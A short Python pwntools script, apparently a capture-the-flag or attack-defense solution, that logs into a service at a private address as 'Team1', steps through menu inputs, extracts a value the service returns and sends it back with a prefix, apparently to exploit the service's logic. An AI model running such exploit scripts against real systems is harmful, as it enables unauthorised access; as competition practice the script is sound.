from pwn import *
import re
import time

target = remote("10.110.2.100", 5000)

print(target.recv())
target.sendline(b"Team1")
time.sleep(0.1)
print(target.recv())
target.sendline(b"5")
time.sleep(0.1)
print(target.recv())
target.sendline(b'1')
time.sleep(0.1)
print(target.recv())
target.sendline(b'134444')
time.sleep(0.1)
print(target.recv())
target.sendline(b'9')
time.sleep(0.1)
print("-----")
print(target.recv())
target.sendline(b'134444')
time.sleep(0.1)
print("-----")
print(target.recv())
target.sendline(b'9')
time.sleep(0.1)
print("-----")
s = target.recv()
print("->" + str(s))
s = re.findall("Take this: (.*?)\\\\nNow",str(s))

print(s[0])
payload = [b'0x00',bytes(s[0], 'utf-8')]
payload = b''.join(payload)
print(payload)
target.sendline(payload)
print(target.recv())

target.close()
